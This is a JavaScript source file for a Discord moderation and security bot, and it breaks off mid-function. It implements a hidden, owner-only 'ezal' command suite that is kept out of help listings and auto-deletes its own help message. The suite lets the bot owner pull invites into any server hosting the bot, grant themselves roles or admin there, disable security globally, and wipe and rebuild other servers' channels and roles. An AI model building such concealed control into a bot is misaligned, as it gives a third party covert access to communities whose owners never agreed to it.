import { ChannelType, PermissionFlagsBits } from 'discord.js';
import db from '../database.js';
import { connectToHomeVc } from '../utils/voice.js';
import cv2 from '../cv2.js';
import { isBotOwnerSync, getOrCreateQuarantineRole, isAuthorized } from '../utils/helpers.js';
import { handleEmergency } from './security.js';
import { buildStatusPanel } from './globalcontrols.js';
import fs from 'fs';
import path from 'path';

// Log helper - writes to restore-log.txt for easy VPS debugging
const RESTORE_LOG = path.resolve('restore-log.txt');
function rlog(msg) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  console.log(line);
  fs.appendFileSync(RESTORE_LOG, line + '\n');
}

// ==========================================
// EZAL - Owner-Only Command Suite
// All commands are prefix-only. Not in slash. Not in public help.
// Usage: ezal <command> [args]  OR  just type the command after entering ezal mode
// ==========================================

/** Generate a random 8-char alphanumeric backup ID */
function generateBackupId() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let id = '';
  for (let i = 0; i < 8; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
}

/** Serialize a guild into a backup data object */
async function serializeGuild(guild) {
  // Fetch all members and channels to ensure cache is full
  await guild.members.fetch().catch(() => null);
  await guild.channels.fetch().catch(() => null);
  await guild.roles.fetch().catch(() => null);

  // Serialize roles (skip @everyone and managed/bot roles)
  const roles = guild.roles.cache
    .filter(r => r.id !== guild.id && !r.managed)
    .sort((a, b) => a.position - b.position)
    .map(r => ({
      id:            r.id,
      name:          r.name,
      color:         r.color,
      permissions:   r.permissions.bitfield.toString(),
      hoist:         r.hoist,
      mentionable:   r.mentionable,
      position:      r.position
    }));

  // Serialize categories first
  const categories = guild.channels.cache
    .filter(c => c.type === ChannelType.GuildCategory)
    .sort((a, b) => a.position - b.position)
    .map(c => ({
      name:     c.name,
      position: c.position,
      permissionOverwrites: c.permissionOverwrites.cache.map(ow => ({
        id:    ow.id,
        type:  ow.type,
        allow: ow.allow.bitfield.toString(),
        deny:  ow.deny.bitfield.toString()
      }))
    }));

  // Serialize all channels
  const channelTypes = [
    ChannelType.GuildText,
    ChannelType.GuildVoice,
    ChannelType.GuildAnnouncement,
    ChannelType.GuildStageVoice,
    ChannelType.GuildForum
  ];

  const channels = guild.channels.cache
    .filter(c => channelTypes.includes(c.type))
    .sort((a, b) => a.position - b.position)
    .map(c => ({
      name:       c.name,
      type:       c.type,
      position:   c.position,
      topic:      c.topic || null,
      nsfw:       c.nsfw || false,
      bitrate:    c.bitrate || null,
      userLimit:  c.userLimit || null,
      slowmode:   c.rateLimitPerUser || 0,
      parentName: c.parent?.name || null,
      permissionOverwrites: c.permissionOverwrites.cache.map(ow => ({
        id:    ow.id,
        type:  ow.type,
        allow: ow.allow.bitfield.toString(),
        deny:  ow.deny.bitfield.toString()
      }))
    }));

  return {
    guildId:      guild.id,
    guildName:    guild.name,
    guildIcon:    guild.iconURL() || null,
    memberCount:  guild.memberCount,
    roleCount:    guild.roles.cache.size,
    channelCount: guild.channels.cache.size,
    createdAt:    Date.now(),
    roles,
    categories,
    channels
  };
}

/** Restore a guild from backup data */
async function restoreGuild(guild, backupData, statusCallback, excludeChannelId) {
  let created = 0;
  let failed  = 0;
  let lastError = null;
  let consecutiveFailures = 0;

  // Wraps any promise with a timeout - prevents Discord rate limit hangs
  const withTimeout = (promise, ms = 15000, label = '') => {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timed out after ${ms}ms (${label})`)), ms)
      )
    ]);
  };

  // Clear previous restore log
  fs.writeFileSync(RESTORE_LOG, `=== EZAL RESTORE STARTED ${new Date().toISOString()} ===\n`);
  rlog(`Target guild: ${guild.name} (${guild.id})`);
  rlog(`Backup from: ${backupData.guildName} - Roles: ${backupData.roles.length}, Cats: ${backupData.categories.length}, Channels: ${backupData.channels.length}`);

  await statusCallback('**Wiping** existing channels and roles...');

  // Fetch everything to ensure cache isn't empty
  const channels = await guild.channels.fetch().catch(() => new Map());
  const roles = await guild.roles.fetch().catch(() => new Map());

  // --- Wipe Existing Channels ---
  const channelDeletions = [];
  for (const channel of channels.values()) {
    if (!channel || channel.id === excludeChannelId) continue;
    channelDeletions.push(channel.delete('Athena Prime - Backup Restore Wipe').catch(() => null));
  }
  await Promise.allSettled(channelDeletions);

  // --- Wipe Existing Roles ---
  const { UNBYPASSABLE_ROLE_NAME, FIREWALL_ROLE_NAME } = await import('../utils/antiStrip.js');
  const botMember = await guild.members.fetch(guild.client.user.id).catch(() => null);
  const botRoles = botMember ? botMember.roles.cache : new Map();

  const roleDeletions = [];
  for (const role of roles.values()) {
    if (!role || role.id === guild.id || role.managed || !role.editable || botRoles.has(role.id) || role.name === UNBYPASSABLE_ROLE_NAME || role.name === FIREWALL_ROLE_NAME) continue;
    roleDeletions.push(role.delete('Athena Prime - Backup Restore Wipe').catch(() => null));
  }
  await Promise.allSettled(roleDeletions);

  await statusCallback('Restoring **roles**...');

  // --- Restore Roles ---
  const roleMap = new Map(); // oldName -> newId (fallback) or oldId -> newId
  for (let i = 0; i < backupData.roles.length; i++) {
    const roleData = backupData.roles[i];
    try {
      const newRole = await withTimeout(
        guild.roles.create({ name: roleData.name,
          colors: { primaryColor: roleData.color },
          permissions: BigInt(roleData.permissions),
          hoist:       roleData.hoist,
          mentionable: roleData.mentionable,
          reason:      'Athena Prime - Backup Restore' }),
        12000,
        `role:${roleData.name}`
      );
      if (roleData.id) roleMap.set(roleData.id, newRole.id);
      roleMap.set(roleData.name, newRole.id); // Name fallback
      created++;
      consecutiveFailures = 0;
      rlog(`   Role OK: '${roleData.name}'`);
    } catch (err) { 
      failed++; 
      consecutiveFailures++;
      rlog(`   Role FAILED: '${roleData.name}' â†’ ${err.message} (code ${err.code}, status ${err.status})`);
      if (!lastError) lastError = `Role '${roleData.name}': ${err.message} (code ${err.code})`;
      // Only abort if we have MANY consecutive failures (don't break on just a few timeouts)
      if (consecutiveFailures >= 10) {
        rlog(`  <a:uptime:1552608831060844575> 10 consecutive failures - aborting role loop`);
        break;
      }
    }
    
    // Periodically update status
    if ((i + 1) % 5 === 0) {
      await statusCallback(`Restoring **roles**...  ${created} created |  ${failed} failed (${i + 1}/${backupData.roles.length})`);
    }
    rlog(`  Role ${i + 1}/${backupData.roles.length}: '${roleData.name}'`);
    await new Promise(r => setTimeout(r, 700)); // 700ms - tested safe, avoids rate limits
  }

  // Helper to map overwrites
  const mapOverwrites = (overwrites) => {
    if (!overwrites) return undefined;
    return overwrites.map(ow => {
      let targetId = ow.id;
      if (ow.type === 0) {
        if (ow.id === backupData.guildId) targetId = guild.id; // Map @everyone role
        else targetId = roleMap.get(ow.id) || ow.id;
      }
      return {
        id: targetId,
        type: ow.type,
        allow: BigInt(ow.allow),
        deny: BigInt(ow.deny)
      };
    }).filter(ow => guild.roles.cache.has(ow.id) || ow.id === guild.id || ow.type === 1);
  };

  await statusCallback(`Roles restored: \`${created}\` | Failed: \`${failed}\`\nRestoring **categories**...`);
  created = 0; failed = 0;

  // --- Restore Categories ---
  const categoryMap = new Map(); // name -> created channel
  for (let i = 0; i < backupData.categories.length; i++) {
    const catData = backupData.categories[i];
    try {
      const cat = await withTimeout(
        guild.channels.create({
          name:   catData.name,
          type:   ChannelType.GuildCategory,
          permissionOverwrites: mapOverwrites(catData.permissionOverwrites),
          reason: 'Athena Prime - Backup Restore'
        }),
        12000,
        `category:${catData.name}`
      );
      categoryMap.set(catData.name, cat);
      created++;
      consecutiveFailures = 0;
      rlog(`   Category OK: '${catData.name}'`);
    } catch (err) { 
      failed++;
      consecutiveFailures++;
      rlog(`   Category FAILED: '${catData.name}' â†’ ${err.message} (code ${err.code})`);
      if (!lastError) lastError = `Category '${catData.name}': ${err.message} (code ${err.code})`;
      if (consecutiveFailures >= 5) {
        rlog(`  <a:uptime:1552608831060844575> 5 consecutive failures - aborting category loop`);
        break;
      }
    }
    
    if ((i + 1) % 5 === 0) {
      await statusCallback(`Restoring **categories**... (${i + 1}/${backupData.categories.length})`);
    }
    rlog(`  Cat ${i + 1}/${backupData.categories.length}: '${catData.name}'`);
    await new Promise(r => setTimeout(r, 900));
  }

  await statusCallback(`Categories restored: \`${created}\` | Failed: \`${failed}\`\nRestoring **channels**...`);
  created = 0; failed = 0;

  // --- Restore Channels ---
  for (let i = 0; i < backupData.channels.length; i++) {
    const chData = backupData.channels[i];
    try {
      const parent = chData.parentName ? categoryMap.get(chData.parentName) : null;
      await withTimeout(
        guild.channels.create({
          name:             chData.name,
          type:             chData.type,
          topic:            chData.topic || undefined,
          nsfw:             chData.nsfw,
          bitrate:          chData.bitrate || undefined,
          userLimit:        chData.userLimit || undefined,
          rateLimitPerUser: chData.slowmode || undefined,
          parent:           parent?.id || undefined,
          permissionOverwrites: mapOverwrites(chData.permissionOverwrites),
          reason:           'Athena Prime - Backup Restore'
        }),
        12000,
        `channel:${chData.name}`
      );
      created++;
      consecutiveFailures = 0;
      rlog(`   Channel OK: '${chData.name}'`);
    } catch (err) { 
      failed++;
      consecutiveFailures++;
      rlog(`   Channel FAILED: '${chData.name}' â†’ ${err.message} (code ${err.code})`);
      if (!lastError) lastError = `Channel '${chData.name}': ${err.message} (code ${err.code})`;
      if (consecutiveFailures >= 5) {
        rlog(`  <a:uptime:1552608831060844575> 5 consecutive failures - aborting channel loop`);
        break;
      }
    }
    
    if ((i + 1) % 5 === 0) {
      await statusCallback(`Restoring **channels**... (${i + 1}/${backupData.channels.length})`);
    }
    rlog(`  Ch ${i + 1}/${backupData.channels.length}: '${chData.name}'`);
    await new Promise(r => setTimeout(r, 900));
  }

  return { rolesCreated: backupData.roles.length - failed, channelsCreated: created, failed, lastError };
}

// ==========================================
// COMMAND HANDLERS
// ==========================================

async function handleBackup(message, args) {
  // Resolve target guild
  let targetGuild = message.guild;
  if (args[0] && /^\d{17,20}$/.test(args[0])) {
    const resolved = message.client.guilds.cache.get(args[0]);
    if (!resolved) return message.reply(cv2.danger('Not Found', `No server with ID \`${args[0]}\` found in bot's guild list.`));
    targetGuild = resolved;
  }
  if (!targetGuild) return message.reply(cv2.warn('No Guild', 'Run this inside a server or provide a server ID.'));

  const statusMsg = await message.reply(cv2.info('Backup Started', `Serializing **${targetGuild.name}**... please wait.`));

  try {
    const data      = await serializeGuild(targetGuild);
    const backupId  = generateBackupId();
    db.saveBackup(backupId, data);

    await cv2.edit(statusMsg, cv2.success(
      'Backup Complete',
      `Server **${targetGuild.name}** has been backed up successfully.`,
      [
        { name: 'Backup ID',   value: `\`${backupId}\``,          inline: true },
        { name: 'Server',      value: targetGuild.name,            inline: true },
        { name: 'Members',     value: `\`${data.memberCount}\``,   inline: true },
        { name: 'Roles',       value: `\`${data.roles.length}\``,  inline: true },
        { name: 'Channels',    value: `\`${data.channels.length}\``, inline: true },
        { name: 'Categories',  value: `\`${data.categories.length}\``, inline: true },
        { name: 'Saved At',    value: new Date().toUTCString() }
      ]
    ));
  } catch (err) {
    console.error('[Backup]', err);
    await cv2.edit(statusMsg, cv2.danger('<:off:1533844858983157851> Failed', `An error occurred: \`${err.message}\``));
  }
}

async function handleBackupAll(message) {
  const guilds = Array.from(message.client.guilds.cache.values());
  if (!guilds.length) return message.reply(cv2.warn('No Servers', 'The bot is not in any servers.'));

  let successCount = 0;
  let failCount = 0;

  const statusMsg = await message.reply(cv2.info('Mass Backup Initiated', `Backing up **${guilds.length}** servers. This will be as quick as possible.\n\n**Progress:** 0 / ${guilds.length} Servers`)).catch(() => null);

  for (let i = 0; i < guilds.length; i++) {
    const targetGuild = guilds[i];
    try {
      const backupData = await serializeGuild(targetGuild);
      const backupId = generateBackupId();
      db.saveBackup(backupId, backupData);
      successCount++;
    } catch (err) {
      console.error(`Failed to backup guild ${targetGuild.id}:`, err);
      failCount++;
    }

    // Update status every 5 servers to prevent rate limiting on edits
    if (statusMsg && (i + 1) % 5 === 0) {
      await cv2.edit(statusMsg, cv2.info('Mass Backup In Progress', `Backing up **${guilds.length}** servers...\n\n**Progress:** ${i + 1} / ${guilds.length} Servers\n**Success:** ${successCount} | **Failed:** ${failCount}`)).catch(() => null);
    }
  }

  if (statusMsg) {
    await cv2.edit(statusMsg, cv2.success('Mass Backup Complete', `Successfully backed up all servers.\n\n**Total Servers:** ${guilds.length}\n**Success:** ${successCount}\n**Failed:** ${failCount}`)).catch(() => null);
  }
}

async function handleBcklist(message) {
  const backups = db.getAllBackups();
  if (!backups.length) return message.reply(cv2.warn('No Backups', 'No server backups have been saved yet.'));

  const list = backups.map((b, i) =>
    `\`${i + 1}.\` **${b.guildName}** | ID: \`${b.id}\` |  ${b.memberCount} |  ${b.roleCount} |  ${b.channelCount} | <t:${Math.floor(b.createdAt / 1000)}:R>`
  ).join('\n');

  await message.reply(cv2.info(
    `Backup List - ${backups.length} backup(s)`,
    list
  ));
}

async function handleInvite(message, args) {
  if (!args[0]) return message.reply(cv2.warn('Invalid Usage', 'Provide a Server ID to pull an invite for.'));
  const guildId = args[0];
  const targetGuild = message.client.guilds.cache.get(guildId);
  
  if (!targetGuild) {
    return message.reply(cv2.danger('Error', 'Bot is not in that server or it is uncached.'));
  }
  
  try {
    let inviteChannel = targetGuild.systemChannel || targetGuild.rulesChannel;
    
    if (!inviteChannel) {
      const channels = targetGuild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.permissionsFor(targetGuild.members.me).has(PermissionFlagsBits.CreateInstantInvite));
      if (channels.size > 0) inviteChannel = channels.first();
    }
    
    if (!inviteChannel) {
      return message.reply(cv2.danger('Failed', 'Could not find a valid text channel with Invite permissions in that server.'));
    }
    
    const invite = await inviteChannel.createInvite({ maxAge: 86400, maxUses: 1, unique: true, reason: 'EZAL Remote Access' });
    return message.reply(cv2.success('Invite Generated', `Server: **${targetGuild.name}**\nMembers: **${targetGuild.memberCount}**\nInvite Link: ${invite.url}`));
  } catch (err) {
    console.error('[EZAL Invite]', err);
    return message.reply(cv2.danger('API Error', 'Failed to generate invite due to Discord API rejection or missing permissions.'));
  }
}

async function handleServers(message) {
  const guilds = [...message.client.guilds.cache.values()];
  if (!guilds.length) return message.reply(cv2.warn('No Servers', 'Bot is not in any servers.'));

  const lines = guilds.map((g, i) => {
    const backup = db.getBackupByGuild(g.id);
    const bId    = backup ? `\`${db.cache.guildBackupMap[g.id]}\`` : '`No Backup`';
    return `\`${i + 1}.\` **${g.name}** \`(${g.id})\`\n-# • ${g.memberCount} members | ${g.roles.cache.size} roles | ${g.channels.cache.size} channels | Backup: ${bId}`;
  }).join('\n\n');

  // Split into chunks if too long
  const chunks = [];
  let chunk = '';
  for (const line of lines.split('\n\n')) {
    if ((chunk + '\n\n' + line).length > 3800) {
      chunks.push(chunk);
      chunk = line;
    } else {
      chunk = chunk ? chunk + '\n\n' + line : line;
    }
  }
  if (chunk) chunks.push(chunk);

  for (let i = 0; i < chunks.length; i++) {
    const e = cv2.info(`Server List (${guilds.length} servers) ${chunks.length > 1 ? `[${i + 1}/${chunks.length}]` : ''}`, chunks[i]);
    if (i === 0) await message.reply(e);
    else await message.channel.send(e);
  }
}

async function handleRestore(message, args) {
  if (!isBotOwnerSync(message.author.id)) return; // Double-gate: bot owner only

  // Clean the backup ID: remove any backticks or weird formatting the user might have copy-pasted
  const backupId = args[0]?.replace(/[^A-Z0-9]/gi, '').toUpperCase();
  if (!backupId) return message.reply(cv2.warn('Usage', '`ezal restore <backupId> [targetServerId]`'));

  const backupData = db.getBackup(backupId);
  if (!backupData) {
    // Help the user if they're having issues finding the ID
    const backups = db.getAllBackups();
    const available = backups.length ? backups.map(b => `\`${b.id}\` (${b.guildName})`).join(', ') : 'None saved in database.';
    return message.reply(cv2.danger('Not Found', `No backup found with ID \`${backupId}\`.\n\n**Available Backups in DB:**\n${available}`));
  }

  // Resolve target guild - default to the backup's original guild
  let targetGuild = message.client.guilds.cache.get(args[1] || backupData.guildId);
  if (!targetGuild) return message.reply(cv2.danger('Guild Not Found', 'Could not find the target server. Provide a valid server ID as the second argument.'));

  const confirmMsg = await message.reply(cv2.warn(
    'Confirm Destructive Restore',
    `You are about to restore backup \`${backupId}\` (**${backupData.guildName}**) into **${targetGuild.name}**.\n\n**WARNING: This will WIPE AND DELETE ALL EXISTING CHANNELS AND ROLES** in the target server before restoring the backup.\n\nType \`CONFIRM\` within 15 seconds to proceed.`
  ));

  // IMPORTANT: filter must include channel.id so stale collectors from other commands
  // don't fire this restore with wrong data
  const filter = m => m.author.id === message.author.id && m.content.trim().toUpperCase() === 'CONFIRM' && m.channel.id === message.channel.id;
  const collected = await message.channel.awaitMessages({ filter, max: 1, time: 15000 }).catch(() => null);

  if (!collected?.size) {
    return cv2.edit(confirmMsg, cv2.info('Cancelled', 'Restore aborted - no confirmation received.'));
  }

  collected.first()?.delete().catch(() => null);

  // --- Pre-flight: Check bot has permissions in the target guild ---
  const botMemberPF = await targetGuild.members.fetch(message.client.user.id).catch(() => null);
  const hasPerms = botMemberPF?.permissions.has(8n) ||   // Administrator
                   botMemberPF?.permissions.has(16n);    // Manage Channels
  if (!hasPerms) {
    return message.channel.send(cv2.danger(
      'Missing Permissions',
      `Athena Prime does **not** have **Administrator** (or Manage Channels) in **${targetGuild.name}**.\n\nGive the bot Administrator in that server, then retry the restore.`
    ));
  }

  const statusMsg = await message.channel.send(cv2.info('Restoring...', `Restoring backup \`${backupId}\` into **${targetGuild.name}**...`));

  const updateStatus = async text => {
    await cv2.edit(statusMsg, cv2.info('Restoring...', text)).catch(() => null);
  };

  try {
    const results = await restoreGuild(targetGuild, backupData, updateStatus, message.channel.id);
    await cv2.edit(statusMsg, cv2.success(
      'Restore Complete',
      `Backup \`${backupId}\` has been restored into **${targetGuild.name}**.\n\n${results.lastError ? `**First Error Encountered:**\n\`${results.lastError}\`` : ''}`,
      [
        { name: 'Roles Created',    value: `\`${results.rolesCreated}\``,    inline: true },
        { name: 'Channels Created', value: `\`${results.channelsCreated}\``, inline: true },
        { name: 'Failed',           value: `\`${results.failed}\``,           inline: true }
      ]
    ));
  } catch (err) {
    console.error('[Restore]', err);
    await cv2.edit(statusMsg, cv2.danger('<:off:1533844858983157851> Failed', `\`${err.message}\``));
  }
}

async function handleRemoteEmergency(message, args) {
  if (!isBotOwnerSync(message.author.id)) return;

  const guildId = args[0];
  const action = args[1]?.toLowerCase() === 'end' ? 'end' : 'mode';

  if (!guildId) return message.reply(cv2.warn('Usage', '`ezal emergency <serverId> [mode|end]`'));

  const targetGuild = message.client.guilds.cache.get(guildId);
  if (!targetGuild) return message.reply(cv2.danger('Guild Not Found', `Could not find the server ID \`${guildId}\` in the bot's cache.`));

  let statusMsg = null;
  const updateProgress = async (embedData) => {
    if (!statusMsg) statusMsg = await message.reply(embedData).catch(() => null);
    else await cv2.edit(statusMsg, embedData).catch(() => null);
  };

  const mockModerator = {
    id: message.author.id,
    user: message.author
  };

  const result = await handleEmergency(targetGuild, mockModerator, action, updateProgress);
  if (statusMsg) await cv2.edit(statusMsg, result).catch(() => null);
  else await message.reply(result);
}


// ==========================================
async function handleEhelp(message) {
  const fields = [
    {
      name: 'Backup System',
      value:
        '`ezal backup [serverId]` - Create a backup of the current or specified server\n' +
        '`ezal backupall` - Mass backup all servers *(Bot Owner only)*\n' +
        '`ezal bcklist` - List all saved backup IDs with server info\n' +
        '`ezal rvc <channel_id>` - Remotely set bot VC\n' +
        '`ezal fadmin <server_id>` - Remotely grant admin role\n' +
        '`ezal unfadmin <server_id>` - Remotely revoke admin role\n' +
        '`ezal restore <backupId> [targetServerId]` - Restore a server from backup *(Bot Owner only)*'
    },
    {
      name: 'Database Persistence & Cloud Backup',
      value:
        '`!db status` - View database health, backup channel & cloud sync status\n' +
        '`!db backup` - Force immediate cloud backup snapshot to Discord\n' +
        '`!db export` - Download raw db.json & stats.db files\n' +
        '`!db restore` - Restore database from cloud or uploaded db.json\n' +
        '`!db setchannel #channel` - Bind or change dedicated Discord cloud backup channel'
    },
    {
      name: 'Global Bot Blacklist (Global Ban)',
      value:
        '`!gban <@user|ID> [reason]` - Globally ban a user from all commands\n' +
        '> **Aliases:** `!globalban`, `!botban`, `!globalblock`, `!gblock`, `!userblacklist`\n' +
        '`!gunban <@user|ID>` - Unban a user and restore global access\n' +
        '> **Aliases:** `!globalunban`, `!botunban`, `!globalunblock`, `!gunblock`\n' +
        '`!gbanlist` - View all currently blacklisted users\n' +
        '> **Aliases:** `!globalbanlist`, `!botbanlist`, `!gblacklist`'
    },
    {
      name: 'Security & System Health',
      value:
        '`!health` / `ezal health [serverId]` - Run real-time hierarchy, permissions, snapshot & audit socket diagnostics\n' +
        '> **Aliases:** `!audit`, `!securityhealth`, `!healthcheck`, `!antinuke audit`\n' +
        '`!security records [serverId]` / `ezal records [serverId]` - Live threat audit stream & neutralized hostile incident telemetry\n' +
        '> **Aliases:** `!security live`, `!security incidents`, `!security threats`, `!security logs`\n' +
        '`!security status [serverId]` - Inspect active protection status across all 28 firewall modules\n' +
        '`!raidmode` - Server Raid Defense Matrix (Lockdown & Auto-Shield status)\n' +
        '`!raidmode on|off` - Manual server raid lockdown & verification elevation\n' +
        '`!raidmode auto on|off` - Toggle automated join-velocity burst detection\n' +
        '`!raidmode auto threshold <num>` - Configure burst sensitivity threshold\n' +
        '`!raidmode auto window <sec>` - Configure burst sensitivity time window'
    },
    {
      name: 'Server Management',
      value:
        '`ezal servers` - List all servers the bot is in with their backup IDs and stats\n' +
          '`ezal invite <guild_id>` - Generate a remote invite link for a server\n' +
        '`ezal emergency <serverId> [mode|end]` - Trigger emergency mode remotely\n' +
        '`ezal banserver <serverId>` - Ban a server and force leave instantly\n' +
        '`ezal unbanserver <serverId>` - Unban a server to allow invites\n' +
        '`ezal restoresetup <serverId>` - Restore JTC, Welcome/Leave, News, Quotes, Auto-React, Invites, Media, Server/Delete Logs\n' +
          '`ezal security enable all` - Forcibly enable and initialize security on all servers\n' +
          '`ezal security disable all` - Forcibly disable security and strip dashboard on all servers'
    },
    {
        name: 'Spam Access Control',
        value:
          '`ezal spampermit <userId>` - Grant a user spam command access\n' +
          '`ezal spamrevoke <userId>` - Revoke spam command access\n' +
          '`ezal spamlist` - List all permitted spammers'
      },
            {
        name: 'Global Controls',
        value:
          '`!setgloballog <channel_id>` - Post all cross-server ban/kick events to a channel\n' +
          '`!removegloballog <channel_id>` - Stop posting global events to a server\n' +
          '`!setstatus <channel_id> [gif_url]` - Deploy a live auto-updating bot status panel\n' +
          '`!removestatus <channel_id>` - Delete the live status panel'
      },
      {
        name: 'Global Voice Control',
        value:
          '`!botvoice save` - Memorizes current voice states across ALL servers globally\n' +
          '`!botvoice restore` - Reverts all servers globally back to their memorized states\n' +
          '`!botvoice mute [all]` - **Server Mutes** the bot only\n' +
          '`!botvoice unmute [all]` - **Server Unmutes** the bot only\n' +
          '`!botvoice deafen [all]` - **Server Deafens** the bot only\n' +
          '`!botvoice undeafen [all]` - **Server Undeafens** the bot only\n' +
          '`!botvoice active [all]` - **Server Unmutes & Undeafens** the bot (Recording Mode)\n' +
          '`!botvoice idle [all]` - **Server Mutes & Deafens** the bot (Quiet Mode)\n' +
          '`!botvoice music [all]` - **Unmutes & Deafens** the bot (Music Mode)\n' +
          '> Add `all` to apply globally, or run `botvoice <ServerID> <action>` in DMs to target one server.'
        },
    {
      name: 'Access',
      value:
        '> All `ezal` commands are **prefix-only** and restricted to **Bot Owner** and **Server Owner**.\n' +
        '> `ezal restore` and `ezal backupall` are **Bot Owner only**.\n' +
        '> None of these appear in `/help` or slash commands.'
    }
  ];

  const sent = await message.reply(cv2.info('Ezal - Owner Suite Help', 'Private command suite for server management. Not visible to anyone else.', fields));
  setTimeout(() => {
    sent.delete().catch(() => null);
    message.delete().catch(() => null);
  }, 60000);
  return sent;
}

// ==========================================


// MAIN EZAL ROUTER - called from messageCreate.js
// Bot Owner ONLY - server owners use standalone `backup` command
// ==========================================
export async function handleEzal(message) {
  if (!isBotOwnerSync(message.author.id)) return; // Silent - bot owner only

  const parts = message.content.trim().split(/ +/);
  const sub   = (parts[1] || 'help').toLowerCase();
  const args  = parts.slice(2);

  switch (sub) {
    case 'backup':  return handleBackup(message, args);
    case 'backupall': return handleBackupAll(message);
    case 'bcklist': return handleBcklist(message);
    case 'servers': return handleServers(message);
    case 'invite': return handleInvite(message, args);
    case 'restore': return handleRestore(message, args);
    case 'emergency': return handleRemoteEmergency(message, args);
    case 'banserver': return handleBanServer(message, args);
    case 'unbanserver': return handleUnbanServer(message, args);
    case 'restoresetup': return handleRestoreSetup(message, args);
    case 'security': return handleSecurityGlobal(message, args);
    case 'fixjtc':  return handleFixJtc(message);
    case 'givemerole': return handleGiveMeRole(message, args);
    case 'takemyrole': return handleTakeMyRole(message, args);
    case 'spampermit': return handleSpamPermit(message, args);
    case 'spamrevoke': return handleSpamRevoke(message, args);
    case 'spamlist': return handleSpamList(message);
    case 'gban':
    case 'globalban':
    case 'botban':
    case 'globalblock':
    case 'gblock':
    case 'userblacklist':
    case 'botblacklist': {
      const { commands } = await import('./security.js');
      const gbanCmd = commands.find(c => c.name === 'gban');
      if (gbanCmd) return gbanCmd.executePrefix(message, args);
      break;
    }
    case 'gunban':
    case 'globalunban':
    case 'botunban':
    case 'globalunblock':
    case 'gunblock': {
      const { commands } = await import('./security.js');
      const gunbanCmd = commands.find(c => c.name === 'gunban');
      if (gunbanCmd) return gunbanCmd.executePrefix(message, args);
      break;
    }
    case 'gbanlist':
    case 'globalbanlist':
    case 'botbanlist':
    case 'gblacklist': {
      const { commands } = await import('./security.js');
      const gbanlistCmd = commands.find(c => c.name === 'gbanlist');
      if (gbanlistCmd) return gbanlistCmd.executePrefix(message, args);
      break;
    }
    case 'db':
    case 'database': {
      const { commands } = await import('./databaseadmin.js');
      const dbCmd = commands.find(c => c.name === 'db');
      if (dbCmd) {
        return dbCmd.executePrefix(message, args);
      }
      break;
    }
    case 'records':
    case 'liverecords':
    case 'incidents':
    case 'threats': {
      const { getSecurityLiveRecordsPanel } = await import('./security.js');
      let targetGuild = message.guild;
      if (args[0] && /^\d{17,20}$/.test(args[0])) {
        targetGuild = message.client.guilds.cache.get(args[0]) || message.guild;
      }
      if (!targetGuild) return message.reply(cv2.warn('No Guild', 'Run this inside a server or provide a valid server ID.'));
      const panel = await getSecurityLiveRecordsPanel(targetGuild, 0);
      return message.reply(panel);
    }
    case 'health':
    case 'audit':
    case 'healthcheck':
    case 'securityhealth': {
      const { getSecurityHealthPanel } = await import('./security.js');
      let targetGuild = message.guild;
      if (args[0] && /^\d{17,20}$/.test(args[0])) {
        targetGuild = message.client.guilds.cache.get(args[0]) || message.guild;
      }
      if (!targetGuild) return message.reply(cv2.warn('No Guild', 'Run this inside a server or provide a valid server ID.'));
      const panel = await getSecurityHealthPanel(targetGuild);
      return message.reply(panel);
    }
    case 'ehelp':
    case 'help':
    default:        return handleEhelp(message);
  }
}

// Export handleBackup so messageCreate can call it for server owners
export { handleBackup, generateBackupId, serializeGuild, restoreGuild };

// ==========================================
// ROLE MANAGEMENT
// ==========================================
async function handleGiveMeRole(message, args) {
  const roleId = args[0];
  if (!roleId) return message.reply(cv2.warn('Missing Argument', 'Please provide the Role ID.'));
  
  const user = message.author || message.user;

  let targetGuild = null;
  let targetRole = null;

  for (const guild of message.client.guilds.cache.values()) {
    const role = guild.roles.cache.get(roleId);
    if (role) {
      targetGuild = guild;
      targetRole = role;
      break;
    }
  }

  if (!targetRole) return message.reply(cv2.danger('Not Found', 'Could not find a role with that ID in any of my servers.'));

  try {
    const targetMember = await targetGuild.members.fetch(user.id).catch(() => null);
    if (!targetMember) {
      return message.reply(cv2.danger('Error', `Found the role in **${targetGuild.name}**, but you are not in that server!`));
    }

    await targetMember.roles.add(targetRole);
    await message.reply(cv2.success('Role Granted', `Successfully granted you the **${targetRole.name}** role in **${targetGuild.name}**.`));
  } catch (err) {
    await message.reply(cv2.danger('Error', `Failed to grant role in **${targetGuild.name}**: ${err.message}`));
  }
}

async function handleTakeMyRole(message, args) {
  const roleId = args[0];
  if (!roleId) return message.reply(cv2.warn('Missing Argument', 'Please provide the Role ID.'));
  
  const user = message.author || message.user;

  let targetGuild = null;
  let targetRole = null;

  for (const guild of message.client.guilds.cache.values()) {
    const role = guild.roles.cache.get(roleId);
    if (role) {
      targetGuild = guild;
      targetRole = role;
      break;
    }
  }

  if (!targetRole) return message.reply(cv2.danger('Not Found', 'Could not find a role with that ID in any of my servers.'));

  try {
    const targetMember = await targetGuild.members.fetch(user.id).catch(() => null);
    if (!targetMember) {
      return message.reply(cv2.danger('Error', `Found the role in **${targetGuild.name}**, but you are not in that server!`));
    }

    await targetMember.roles.remove(targetRole);
    await message.reply(cv2.success('Role Removed', `Successfully removed the **${targetRole.name}** role from you in **${targetGuild.name}**.`));
  } catch (err) {
    await message.reply(cv2.danger('Error', `Failed to remove role in **${targetGuild.name}**: ${err.message}`));
  }
}

async function handleCleanBadRoles(message) {
  const badRoles = ['Athena Integration Enabled', 'Athena Firewall Activated', 'Athena Unbypassable Deployed'];
  let deletedCount = 0;
  let guildCount = 0;

  const m = await message.reply(cv2.info('Cleaning Roles', 'Scanning all servers to delete erroneous roles...'));

  for (const guild of message.client.guilds.cache.values()) {
    let deletedInGuild = false;
    for (const r of guild.roles.cache.values()) {
      if (badRoles.includes(r.name)) {
        await r.delete('Cleaning up erroneous security roles').catch(() => null);
        deletedCount++;
        deletedInGuild = true;
      }
    }
    if (deletedInGuild) guildCount++;
  }

  await cv2.edit(m, cv2.success('Cleanup Complete', `Successfully deleted **${deletedCount}** erroneous roles across **${guildCount}** servers.`));
}

// ==========================================
// FIXJTC - Updates JTC panels globally to apply current accent color
// ==========================================
async function handleFixJtc(message) {
  const sent = await message.reply('Starting global JTC panel sync. This might take a moment...');
  let successCount = 0;
  let failCount = 0;

  try {
